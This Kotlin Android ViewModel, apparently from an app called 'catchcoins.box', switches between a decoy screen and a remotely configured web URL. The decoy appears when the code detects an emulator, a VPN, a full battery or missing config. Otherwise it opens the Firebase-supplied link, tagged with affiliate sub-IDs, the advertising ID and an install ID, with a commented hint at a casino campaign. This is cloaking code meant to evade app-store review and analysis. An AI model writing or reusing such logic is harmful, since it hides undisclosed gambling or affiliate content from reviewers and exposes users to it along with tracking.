package catchcoins.box

import android.os.Build
import android.util.Log
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.google.firebase.ktx.BuildConfig
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.launch
import java.util.Locale
import javax.inject.Inject

@HiltViewModel
class MainViewModel @Inject constructor(private val repo: SystemRepo) : ViewModel() {
    private val _showData = MutableLiveData<MainState>(MainState.Loading)
    val showData = _showData
    private val remoteConfig = Firebase.remoteConfig


    fun getFromLocal(
        deeplink: String?,
        advId: String?,
        checkInternet: Boolean,
        apsUid: String,
        batteryLevel: Int,
        vpnActive: Boolean
    ) {
        val pathUrl = repo.getDataFromSharedPreferences()
        //val checkInternet = repo.checkedInternetConnection()
        //"myapp://sub5=jaylgt1o35eslg8bin6y&sub1=SSS&sub2=CASUMOFI&sub3=SSS&sub4=CASUMOFI"
        //val advId = "advId"
        //Log.d("AAAAAA", "deeplink $deeplink")
        //Log.d("AAAAAA", "advId $advId")
        if (pathUrl != "") {
            if (checkInternet) {
                _showData.value = MainState.Success(url = pathUrl)
                //Log.d("AAAAAA", "pathUrl $pathUrl")
            } else {
                _showData.value = MainState.NoInternet
            }
        } else {
            if (checkInternet) {
                viewModelScope.launch {
                    val configSettings = remoteConfigSettings {
                        minimumFetchIntervalInSeconds = 3600
                    }
                    remoteConfig.setConfigSettingsAsync(configSettings)
                    //val apsUid = repo.apsUid()
                    //Log.d("AAAAAA", "apsUid $apsUid")
                    remoteConfig.fetchAndActivate()
                        .addOnCompleteListener {
                            if (it.isSuccessful) {
                                val isCheckedVpn = remoteConfig.getBoolean("to")
                                val resultUrl1 = remoteConfig.getString("url1")
                                val resultUrl2 = remoteConfig.getString("url2")
                                //val batteryLevel = repo.getBatteryLevel()
                                //Log.d("AAAAAA", "isCheckedVpn $isCheckedVpn")
                               //Log.d("AAAAAA", "resultUrl1 $resultUrl1")
                                //Log.d("AAAAAA", "resultUrl2 $resultUrl2")
                               // Log.d("AAAAAA", "batteryLevel $batteryLevel")
                                if (isCheckedVpn) {
                                    //val vpnActive = repo.vpnActive()
                                    if (checkIsEmu() || (resultUrl1.isEmpty() && resultUrl2.isEmpty()) || vpnActive || batteryLevel > 99) {
                                        _showData.value = MainState.Mock
                                    } else {
                                        if (deeplink == null) {
                                            _showData.value = MainState.Success(url = resultUrl1)
                                        } else {
                                            val subIds = parseSub(deeplink)
                                            val link =
                                                "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id=${advId}&apps_id=${apsUid}"
                                           // Log.d("AAAAAA", "link $link")
                                            _showData.value = MainState.Success(url = link)
                                        }
                                    }
                                } else {
                                    if (checkIsEmu() || (resultUrl1.isEmpty() && resultUrl2.isEmpty()) || batteryLevel > 99) {
                                        _showData.value = MainState.Mock
                                    } else {
                                        if (deeplink == null) {
                                            _showData.value = MainState.Success(url = resultUrl1)
                                        } else {
                                            val subIds = parseSub(deeplink)
                                            val link =
                                                "${resultUrl2}?key=${subIds["5"]}&sub1=${subIds["1"]}&sub2=${subIds["2"]}&sub3=${subIds["3"]}&sub4=${subIds["4"]}&adv_id=${advId}&apps_id=${apsUid}"
                                            Log.d("AAAAAA", "link $link")
                                            _showData.value = MainState.Success(url = link)
                                        }
                                    }
                                }
                            } else {
                                _showData.value = MainState.NoInternet
                            }
                        }.addOnFailureListener {
                            _showData.value = MainState.NoInternet
                        }
                }

            } else {
                _showData.value = MainState.NoInternet
            }
        }
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") &&
                Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }



    private fun parseSub(url:String): Map<String, String> {
        val regex = Regex("""(?<=sub)\d+=([^&]+)""")
        val matches = regex.findAll(url)
        val subIds = mutableMapOf<String, String>()

        for (match in matches) {
            val key = match.groupValues[0][0].toString()
            val value = match.groupValues[1]
            subIds[key] = value
        }
        return subIds
    }
}